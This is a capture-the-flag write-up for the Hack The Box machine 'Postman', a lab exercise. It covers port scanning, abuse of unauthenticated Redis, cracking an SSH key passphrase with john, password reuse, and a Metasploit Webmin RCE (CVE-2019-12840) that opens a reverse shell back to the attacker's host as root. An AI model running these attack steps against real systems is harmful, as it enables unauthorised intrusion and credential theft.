# Postman

## SYN Scan
```
nmap -sS -sV -O -p- -v -Pn -T4 -oA nmap/full_syn 10.10.10.160

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Webmin
![webmin](./screenshots/webmin.png)

![webmin_login](./screenshots/webmin_login.png)

## Remote Redis Does Not Require Authentication
```
$ nc 10.10.10.160 6379
INFO
$2724
...
# Server
redis_version:4.0.9
...
```

## SSH Login via Authorized Key (Redis)
https://m0053sec.wordpress.com/2020/02/13/redis-remote-code-execution-rce/

```
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

## Encrypted RSA Private Key #1 (Matt)
```
redis@Postman:/dev/shm$ ls -l /opt/id_rsa.bak
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
```

```
redis@Postman:/dev/shm$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
...
-----END RSA PRIVATE KEY-----
```

### Cracked The RSA Password Using JohnRipper
```
john matt_id_rsa.john --wordlist=/usr/share/wordlists/rockyou
...
computer2008     (ssh/matt_id_rsa) 
```

## Privilege Escalatio #1
Used the password of `SSH RSA private key` to login as `Matt` user.
```
redis@Postman:/opt$ su Matt
```

```
Matt@Postman:/opt$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
```

## The User Flag
```
Matt@Postman:~$ ls -l user.txt 
-rw-rw---- 1 Matt Matt 33 Apr  4 16:47 user.txt
```

```
Matt@Postman:~$ cat user.txt 
02505f44b4fbd37b91014930f2339824
```

## ## Encrypted RSA Private Key #2 (Matt)
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,4FC44D79F1BC0D141DB22CCB08108C44

O9bdxmDVMF8uvq6lHIN4Irz1aNQc56PBhYlnBu28FvDwG/CoXj47xuinWbrrpq5s
zWWtGo4wDI+Be4Z8Gb1DznUtpdjVdR34PjNyqh8EL9t5hUMSTvMIQFhy/byjGgKH
oDVh+MA7jMHHur8EoMiqeZq1hD1OXwA505Fr2riqNMtDqGNb82sIqTCeA8wlVQEE
FHeP0BfJn4gS2i4cPF2GBjpKUsh4s5urAPYfNinkfAv3Ugqnr9+8xWLJqDaTc9cG
HJ5VtOnt6gVeytkihRTyTDIl2kBMVvjWpzSus2ybjIHH+7FKpISme6VlH+ESL7d1
aWkH7rJjoi5tWO5MO0H1d5eXuyJFOpoqsW8jgegztKIYUYB6CIaTYa8Sc+Wr7XYn
...
```

### Cracked The RSA Password Using JohnRapper
```
john matt_2_id_rsa.john --fork=12 --wordlist=/usr/share/wordlists/rockyou.txt
...
computer2008     (matt_2_id_rsa)
...
```

## SimpleHTTPServer
```
redis@Postman:/var/www$ ls -l SimpleHTTPPutServer.py 
-rw-rw-r-- 1 Matt Matt 482 Aug 25  2019 SimpleHTTPPutServer.py
```

```python
import SimpleHTTPServer
import BaseHTTPServer

class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_PUT(self):
        print self.headers
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)
        with open(path, "wb") as dst:
            dst.write(self.rfile.read(length))


if __name__ == '__main__':
    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
```

## Webmin Setup Output
```
redis@Postman:/$ ls -l webmin-setup.out 
-rw-r--r-- 1 root root 2086 Aug 25  2019 webmin-setup.out
```

```
Web server port (default 10000): Login name (default admin): Login password: ***********************************************************************
```

## Webmin Panel Login
Used the `password of RSA keys` and the username `Matt` to log in to Webmin panel.

```
Matt: computer2008
```

![webmin_panel](./screenshots/webmin_panel.png)

## Privileged RCE via Package Updates (Webmin)
In `Webmin` through `1.910`, any user authorized to the "Package Updates" module can execute arbitrary commands with `root privileges` via the data parameter to update.cgi.

https://nvd.nist.gov/vuln/detail/CVE-2019-12840

https://www.cvedetails.com/cve/CVE-2019-12840/?q=CVE-2019-12840

https://www.exploit-db.com/exploits/46984

```
msf6 exploit(linux/http/webmin_packageup_rce) > set password computer2008
password => computer2008
msf6 exploit(linux/http/webmin_packageup_rce) > set username Matt
username => Matt
msf6 exploit(linux/http/webmin_packageup_rce) > set payload cmd/unix/reverse_python 
payload => cmd/unix/reverse_python
msf6 exploit(linux/http/webmin_packageup_rce) > set lhost tun0
lhost => 10.10.14.33
msf6 exploit(linux/http/webmin_packageup_rce) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf6 exploit(linux/http/webmin_packageup_rce) > set rhosts postman
rhosts => postman
```

```
msf6 exploit(linux/http/webmin_packageup_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.33:4444 
[+] Session cookie: 27e85b836d61b08515e38ad8c16fa1f9
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.33:4444 -> 10.10.10.160:47404) at 2021-04-05 17:02:18 +0300
```

```
msf6 exploit(linux/http/webmin_packageup_rce) > sessions -i 1
[*] Starting interaction with 1...

id
uid=0(root) gid=0(root) groups=0(root)
```

## The Root Flag
```
ls -l /root/
total 8
drwxrwxr-x 6 root root 4096 Oct  2  2019 redis-5.0.0
-rw-r--r-- 1 root root   33 Apr  4 16:47 root.txt
```

```
cat /root/root.txt
d8d9bff3c8d306e00c163fd192338562
```
